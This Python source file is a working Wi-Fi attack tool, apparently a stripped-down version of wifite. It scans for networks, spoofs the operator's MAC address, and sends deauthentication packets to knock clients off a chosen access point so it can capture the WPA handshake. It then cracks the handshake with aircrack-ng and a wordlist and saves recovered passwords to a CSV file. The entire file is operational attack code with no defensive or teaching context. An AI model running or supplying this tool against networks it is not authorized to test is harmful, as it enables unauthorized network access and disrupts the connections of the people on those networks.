#!/usr/bin/python3
import csv  # Exporting and importing cracked aps
import os  # File management
import time  # Measuring attack intervals
import random  # Generating a random MAC address.
import errno  # Error numbers

import sys  # Flushing

from shutil import copy  # Copying .cap files
from tempfile import mkdtemp  # Create tempdir
# Executing, communicating with, killing processes
from subprocess import Popen, run, PIPE, DEVNULL
from signal import SIGINT, SIGTERM

import re  # RegEx, Converting SSID to filename
import argparse  # arg parsing

################################
# GLOBAL VARIABLES IN ALL CAPS #
################################

# Basic console colors
colors = {
    'W': '\033[0m',  # white (normal)
    'R': '\033[31m',  # red
    'G': '\033[32m',  # green
    'O': '\033[33m',  # orange
    'B': '\033[34m',  # blue
    'P': '\033[35m',  # purple
    'C': '\033[36m',  # cyan
    'GR': '\033[37m',  # gray
    'D': '\033[2m'  # dims current color. {W} resets.
}

# Helper string replacements
replacements = {
    '{+}': '{W}{D}[{W}{G}+{W}{D}]{W}',
    '{!}': '{W}{D}[{W}{R}!{W}{D}]{W}',
    '{?}': '{W}{D}[{W}{C}?{W}{D}]{W}'
}


def color(text):
    ''' Returns colored string '''
    output = text
    for (key, value) in replacements.items():
        output = output.replace(key, value)
    for (key, value) in colors.items():
        output = output.replace('{%s}' % key, value)
    return output


###################
# DATA STRUCTURES #
###################

# Global variables
basename = sys.argv[0][sys.argv[0].rfind(os.sep) + 1:]
mac_pattern = re.compile('([A-F0-9]{2}:){5}[A-F0-9]{2}', re.I)


def mac_search(string):
    try:
        mac_addr = re.search(mac_pattern, string).group()
        return mac_addr
    except:
        return ""


def ConfirmRunningAsRoot():
    if os.getuid() != 0:
        print(
            color(" {!} {O}ERROR: {G}" + basename +
                  "{W} must be run as {R}root{W}"))
        exit(1)


def ConfirmCorrectPlatform():
    if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]:
        print(
            color(" {!} {O}WARNING: {G}" + basename +
                  "{W} must be run on {O}linux{W}"))
        exit(1)


def program_exists(program):
    """
        Uses 'which' (linux command) to check if a program is installed.
    """
    proc = run(['which', program], stdout=DEVNULL, stderr=DEVNULL)
    if proc.returncode == 0:
        return True
    return False


def sec_to_hms(sec):
    """
        Converts integer sec to h:mm:ss format
    """
    if sec <= -1:
        return '[endless]'
    h = sec / 3600
    sec %= 3600
    m = sec / 60
    sec %= 60
    return '[%02d:%02d:%02d]' % (h, m, sec)


def send_interrupt(process):
    """
        Sends interrupt signal to process's PID.
    """
    try:
        os.kill(process.pid, SIGINT)
    except OSError:
        pass  # process cannot be killed
    except TypeError:
        pass  # pid is incorrect type
    except UnboundLocalError:
        pass  # 'process' is not defined
    except AttributeError:
        pass  # Trying to kill "None"


def generate_random_mac(old_mac):
    """
        Generates a random MAC address.
        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
    """
    random.seed()
    new_mac = old_mac[:8].lower().replace('-', ':')
    for i in range(0, 6):
        if i % 2 == 0:
            new_mac += ':'
        new_mac += '0123456789abcdef'[random.randint(0, 15)]
    # Prevent generating the same MAC address via recursion.
    if new_mac == old_mac:
        new_mac = generate_random_mac(old_mac)
    return new_mac


def parse_clients(filename):
    """
        Parses given lines from airodump-ng CSV file.
        Returns list: List of target's clients.
    """
    if not os.path.exists(filename): return []
    clients = []
    try:
        hit_clients = False
        with open(filename, 'r') as csvfile:
            clientreader = csv.reader(csvfile)
            for row in clientreader:
                if len(row) < 2:
                    continue
                if not hit_clients:
                    if row[0].strip() == 'Station MAC':
                        hit_clients = True
                    continue
                else:
                    if len(row) < 6:
                        continue
                    client = mac_search(row[0])
                    if client:
                        clients.append(client)
    except IOError as e:
        print("I/O error({0}): {1}".format(e.errno, e.strerror))
        return []
    return clients


class Wpa_Attack:
    def __init__(self):
        self.iface = ""
        self.iface_monitor = ""
        self.origin_mac = ""
        self.current_mac = ""
        self.channel = ""
        self.target_bssid = ""
        self.target_channel = ""
        self.target_essid = ""
        self.target_key = ""
        self.got_handshake = False
        self.WPA_DEAUTH_COUNT = 1
        self.WPA_ATTACK_TIMEOUT = 300
        self.WPA_DEAUTH_TIMEOUT = 10
        self.WPA_DICTIONARY = ""
        self.DO_NOT_CHANGE_MAC = True

        self.wpa_handshakedir = sys.path[0] + os.sep + 'handshake'
        if not os.path.exists(self.wpa_handshakedir):
            os.mkdir(self.wpa_handshakedir)
        self.cracked_csv = sys.path[0] + os.sep + 'cracked.csv'
        if not os.path.exists(self.cracked_csv):
            with open(self.cracked_csv, 'w') as f:
                f.write("SSID,BSSID,PASSWORD\n")

    def initial_check(self):
        """
            Ensures required programs are installed.
        """
        airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng']
        for air in airs:
            if program_exists(air):
                continue
            print(
                color(" {!} {O}required program not found: {R}" + air + "{W}"))
            print(
                color(
                    " {!} {O}this program is bundled with the aircrack-ng suite:{W}"
                ))
            print(color(" {!} {C}       http://www.aircrack-ng.org/{W}"))
            print(color(" {!} {O}or: sudo apt-get install aircrack-ng\n{W}"))
            exit(1)

        if not program_exists('iwconfig'):
            print(color(" {!} {O}wifite requires the program {R}iwconfig{W}"))
            exit(1)

        if not program_exists('ifconfig'):
            print(color(" {!} {O}wifite requires the program {R}ifconfig{W}"))
            exit(1)

    def build_opt_parser(self):
        argparser = argparse.ArgumentParser()
        argparser.add_argument(
            '--dict',
            help='Specificy dictionary to use when cracking WPA.',
            action='store',
            dest='dic')
        argparser.add_argument('-dict',
                               help=argparse.SUPPRESS,
                               action='store',
                               dest='dic')
        argparser.add_argument('--mac',
                               help='Anonymize MAC address.',
                               action='store_true',
                               default=False,
                               dest='mac_anon')
        argparser.add_argument('-mac',
                               help=argparse.SUPPRESS,
                               action='store_true',
                               default=False,
                               dest='mac_anon')
        argparser.add_argument('-c',
                               help='Channel to scan for targets.',
                               action='store',
                               dest='channel')
        return argparser

    def handle_args(self):
        """
            Handles command-line arguments, sets global variables.
        """
        opt_parser = self.build_opt_parser()
        options = opt_parser.parse_args()
        try:
            if options.dic:
                try:
                    self.WPA_DICTIONARY = options.dic
                except IndexError:
                    print(color(" {!} {O}no WPA dictionary given!{W}"))
                else:
                    if os.path.exists(options.dic):
                        print(
                            color(" {+} WPA dictionary set to {G}%s{W}" %
                                  (self.WPA_DICTIONARY)))
                    else:
                        print(
                            color(
                                " {!} {O}WPA dictionary file not found:{R}%s{W}"
                                % (options.dic)))
            if options.channel:
                try:
                    self.channel = int(options.channel)
                except ValueError:
                    print(
                        color(" {!} {O}invalid channel: {C}" +
                              options.channel + "{W}"))
                except IndexError:
                    print(color(" {!} {O}no channel given!{W}"))
                else:
                    print(
                        color(" {+} channel set to {G}%s{W}" %
                              (str(self.channel))))
            if options.mac_anon:
                print(color(" {+} mac address anonymizing {G}enabled{W}"))
                print(
                    color(
                        "{O}     not only works if device is not already in monitor mode!{W}"
                    ))
                self.DO_NOT_CHANGE_MAC = False
        except IndexError:
            print('\nIndexerror')

    def mac_anonymize(self):
        """
            Changes MAC address of 'iface' to a random MAC.
            Only randomizes the last 6 digits of the MAC, so the vender says the same.
            Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
        """
        if self.DO_NOT_CHANGE_MAC: return
        proc = run(['ifconfig', self.iface],
                   stdout=PIPE,
                   stderr=DEVNULL,
                   encoding='utf-8')
        self.origin_mac = mac_search(proc.stdout)
        if self.origin_mac:
            self.current_mac = generate_random_mac(self.origin_mac)
            run(['ifconfig', self.iface, 'down'],
                stdout=DEVNULL,
                stderr=DEVNULL)
            sys.stdout.write(
                color(
                    " {+} changing {G}%s{W}'s MAC from {P}%s{W} to {C}%s{W}..."
                    % (self.iface, self.origin_mac, self.current_mac)))
            sys.stdout.flush()
            run(['ifconfig', self.iface, 'hw', 'ether', self.current_mac],
                stdout=DEVNULL,
                stderr=DEVNULL)
            run(['ifconfig', self.iface, 'up'], stdout=DEVNULL, stderr=DEVNULL)
            print('done')

    def mac_change_back(self):
        """
            Changes MAC address back to what it was before attacks began.
        """
        if not self.current_mac: return
        sys.stdout.write(
            color(" {+} changing {G}%s{W}'s mac back to {C}%s{W}..." %
                  (self.iface, self.origin_mac)))
        sys.stdout.flush()

        run(['ifconfig', self.iface, 'down'], stdout=DEVNULL, stderr=DEVNULL)
        run(['ifconfig', self.iface, 'hw', 'ether', self.origin_mac],
            stdout=DEVNULL,
            stderr=DEVNULL)
        run(['ifconfig', self.iface, 'up'], stdout=DEVNULL, stderr=DEVNULL)
        print("done")

    def start_monitor_mode(self):
        proc = run(['iwconfig', self.iface], stdout=PIPE, stderr=DEVNULL)
        if proc.stdout.find(b'Mode:Monitor') == -1:
            self.mac_anonymize()
            run(['airmon-ng', 'start', self.iface],
                stdout=DEVNULL,
                stderr=DEVNULL)
            print(
                color(" {!} Start Wireless interface Monitor mode: {O}" +
                      self.iface + "{W}"))
        proc = run(['iwconfig'], stdout=PIPE, stderr=DEVNULL, encoding='utf-8')
        if 'Mode:Monitor' not in proc.stdout:
            print(
                color(
                    "{!} {O}" + self.iface +
                    "{W}doesn't support monitor mode,please change other wireless"
                ))
            exit(1)
        for line in proc.stdout.split('\n'):
            if line.find('Mode:Monitor') != -1:
                self.iface_monitor = line.split()[0]
                break

    def stop_monitor_mode(self):
        proc = run(['airmon-ng', 'stop', self.iface_monitor],
                   stdout=DEVNULL,
                   stderr=DEVNULL)
        if proc.returncode == 0:
            print(
                color(" {!} Stop Wireless interface Monitor mode: {O}" +
                      self.iface_monitor + "{W}"))
            self.mac_change_back()

    def initial_ifaces(self):
        proc = run(['iwconfig'], stdout=PIPE, stderr=DEVNULL, encoding='utf-8')
        for line in proc.stdout.split('\n'):
            if line.find('Mode:Monitor') != -1:
                self.iface_monitor = line.split()[0]
                self.stop_monitor_mode()
        self.iface_monitor = ""

    def get_iface(self):
        print(color(" {+} scanning for wireless devices..."))
        proc = run(['iwconfig'], stdout=PIPE, stderr=DEVNULL, encoding='utf-8')
        ifaces = []
        for line in proc.stdout.split('\n'):
            if re.search('^[^ ]+ ', line):
                ifaces.append(line.split()[0])
        if len(ifaces) > 1:
            print(
                color(" {+} Found {G}" + str(len(ifaces)) +
                      "{W} wireless devices..."))
            sys.stdout.write(color(" {+} "))
            for num, iface in enumerate(ifaces):
                sys.stdout.write(
                    color("{G}" + str(num + 1) + "{GR}:{C}" + iface + "{W}\t"))
            sys.stdout.flush()
            print('')
            try:
                while not self.iface:
                    ri = input(
                        color(
                            " {+} Please select the wireless number {G} [1-%s] {W}: "
                            % (len(ifaces))))
                    if int(ri) >= 1 and int(ri) <= len(ifaces): break
                self.iface = ifaces[int(ri) - 1]
            except KeyboardInterrupt:
                print(color("\n {!} {R}(^C) {O}interrupted{W}"))
                exit(1)
        elif len(ifaces) == 1:
            self.iface = ifaces[0]
        else:
            print(color(" {!} {O}no wireless interfaces were found.{W}"))
            print(
                color(
                    " {!} {O}you need to plug in a wifi device or install drivers.{W}"
                ))
            exit(1)

    def scan(self):
        self.get_iface()
        self.start_monitor_mode()
        self.tempdir = mkdtemp(prefix='wifite')
        airodump_file_prefix = os.path.join(self.tempdir, 'wifite')
        csv_file = airodump_file_prefix + '-01.csv'
        command = [
            'airodump-ng', '-a', '--write-interval', '1', '-w',
            airodump_file_prefix
        ]
        if self.channel:
            command.append('-c')
            command.append(str(self.channel))
        command.append(self.iface_monitor)
        proc = Popen(command, stdout=sys.stdout, stderr=sys.stderr)
        try:
            while True:
                pass
        except KeyboardInterrupt:
            proc.send_signal(SIGINT)
            try:
                while not self.target_bssid:
                    ri = input(
                        color(
                            " {+} Please select target {O}BSSID{W} to crack :")
                    )
                    self.target_bssid = mac_search(ri)
                with open(csv_file) as f:
                    for line in f.readlines():
                        if self.target_bssid in line: break
                self.target_channel = line.split(',')[3]
                self.target_essid = line.split(',')[13].strip()
            except KeyboardInterrupt:
                print(color("\n {!} {R}(^C) {O}interrupted{W}"))
                self.stop_monitor_mode()
                exit(1)

    def has_handshake(self, capfile):
        """
            Uses aircrack-ng to check for handshake.
            Returns True if found, False otherwise.
        """
        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + self.target_bssid + ' ' + capfile
        proc_crack = run(crack,
                         stdout=PIPE,
                         stderr=DEVNULL,
                         shell=True,
                         encoding='utf-8')
        return (proc_crack.stdout.find('Passphrase not in dictionary') != -1)

    def wpa_crack(self, capfile):
        """
            Cracks cap file using aircrack-ng
            This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
            they can do so manually.
        """
        print(
            color(
                "\n {GR}[00:00:00]{W} cracking {C}%s{W} with {O}aircrack-ng{W}"
                % (self.target_essid)))
        wpakey_file = os.path.join(self.tempdir, 'wpakey.txt')
        cmd = [
            'aircrack-ng',
            '-a',
            '2',  # WPA crack
            '-w',
            self.WPA_DICTIONARY,  # Wordlist
            '-l',
            wpakey_file,  # Save key to file
            '-b',
            self.target_bssid,  # BSSID of target
            capfile
        ]

        proc = Popen(cmd, stdout=sys.stdout, stderr=DEVNULL)
        try:
            while proc.poll() == None:
                pass
            if proc.poll() != None:  # aircrack stopped
                if os.path.exists(wpakey_file):  # Cracked
                    with open(wpakey_file) as f:
                        self.target_key = f.read().strip()
                    print(
                        color("\n {+} cracked {C}%s{W} ({G}%s{W})!" %
                              (self.target_essid, self.target_bssid)))
                    print(
                        color(' {+} key:    "{C}%s{W}"\n' % (self.target_key)))
                    with open(self.cracked_csv, 'a') as f:
                        f.write(self.target_essid + ',' + self.target_bssid +
                                ',' + self.target_key + '\n')
                else:
                    print(
                        color(
                            "\n {!} {R}crack attempt failed{W}: {O}passphrase not in dictionary{W}"
                        ))

        except KeyboardInterrupt:
            print(color("\n {!} {R}(^C) {O}WPA cracking interrupted{W}"))
            proc.send_signal(SIGINT)

    def wpa_get_handshake(self):
        file_prefix = os.path.join(self.tempdir, 'handshake')
        csv_file = file_prefix + '-01.csv'
        temp_cap_file = file_prefix + '-01.cap'
        try:
            cmd = [
                'airodump-ng', '-w', file_prefix, '-c', self.target_channel,
                '--write-interval', '1', '--bssid', self.target_bssid,
                self.iface_monitor
            ]
            proc = Popen(cmd, stdout=DEVNULL, stderr=DEVNULL, encoding='utf-8')
            proc_deauth = None
            start_time = time.time()
            seconds_running = 0
            seconds_since_last_deauth = 8
            print(
                color(
                    " {GR}%s{W} starting {G}wpa handshake capture{W} on {C}%s{W}"
                    %
                    (sec_to_hms(self.WPA_ATTACK_TIMEOUT), self.target_essid)))
            start_time = time.time()
            while not self.got_handshake and seconds_running < self.WPA_ATTACK_TIMEOUT:
                time.sleep(1)
                seconds_since_last_deauth += int(time.time() - start_time -
                                                 seconds_running)
                seconds_running = int(time.time() - start_time)
                print(
                    "                                                          \r",
                    end='')
                print(color(
                    " {GR}%s{W} listening for handshake...\r" %
                    (sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running))),
                      end='')
                sys.stdout.flush()
                if seconds_since_last_deauth > self.WPA_DEAUTH_TIMEOUT:
                    seconds_since_last_deauth = 0
                    clients = parse_clients(csv_file)
                    if clients:
                        for client in clients:
                            time.sleep(0.5)
                            cmd = [
                                'aireplay-ng',
                                '--ignore-negative-one',
                                '--deauth',
                                str(self.WPA_DEAUTH_COUNT
                                    ),  # Number of packets to send
                                '-a',
                                self.target_bssid
                            ]
                            cmd.append('-c')
                            cmd.append(client)
                            cmd.append(self.iface_monitor)
                            proc_deauth = Popen(cmd,
                                                stdout=DEVNULL,
                                                stderr=DEVNULL)
                            proc_deauth.wait()
                            print(color(
                                " {GR}%s{W} sending {G}%s{W} deauth to {C}%s{W}...\r"
                                % (sec_to_hms(self.WPA_ATTACK_TIMEOUT -
                                              seconds_running),
                                   str(self.WPA_DEAUTH_COUNT), client)),
                                  end='')
                            sys.stdout.flush()
                    else:
                        print(color(
                            " {GR}%s{W} sending {G}%s{W} deauth to {O}*broadcast*{W}...      \r"
                            % (sec_to_hms(self.WPA_ATTACK_TIMEOUT -
                                          seconds_running),
                               str(self.WPA_DEAUTH_COUNT))),
                              end='')
                        sys.stdout.flush()
                        time.sleep(1)
                if self.has_handshake(temp_cap_file):
                    self.got_handshake = True
            if not self.got_handshake:
                print(
                    color(
                        " {R}[00:00:00]{O} unable to capture handshake in time{W}"
                    ))
                self.stop_monitor_mode()
            else:
                proc.send_signal(SIGINT)
                if proc_deauth: proc_deauth.send_signal(SIGINT)
                cap_file = self.wpa_handshakedir + os.sep + re.sub(r'[^a-zA-Z0-9_-]', '',
                    self.target_essid) + '_' + self.target_bssid.replace(':', '-') + '_' + \
                str(time.strftime("%M%S",time.localtime())) + '.cap'
                copy(temp_cap_file, cap_file)
                cap2hccapx = sys.path[0] + os.sep + 'cap2hccapx.bin'
                if os.path.exists(cap2hccapx):
                    try:
                        run([cap2hccapx, cap_file, cap_file[:-3] + 'hccapx'],
                            stdout=DEVNULL,
                            stderr=DEVNULL)
                    except:
                        pass
                self.stop_monitor_mode()
                if self.WPA_DICTIONARY == '':
                    print(
                        color(
                            " {!} {O}No WPA dictionary found! use -dict <file> command-line argument{W}"
                        ))
                else:
                    self.wpa_crack(cap_file)
                print(color(" {+} {O}handshake captured!{W} saved as:"))
                print(color("     {C}%s{W}" % (cap_file)))

        except KeyboardInterrupt:
            print(
                color(
                    "\n {!} {R}(^C) {O}WPA handshake capture interrupted{W}"))
            proc.send_signal(SIGINT)
            if proc_deauth: proc_deauth.send_signal(SIGINT)
            self.stop_monitor_mode()

    def Start(self):
        self.handle_args()
        self.initial_check()
        ConfirmRunningAsRoot()
        ConfirmCorrectPlatform()
        self.initial_ifaces()
        self.scan()
        self.wpa_get_handshake()


if __name__ == "__main__":
    wpa_attack = Wpa_Attack()
    wpa_attack.Start()
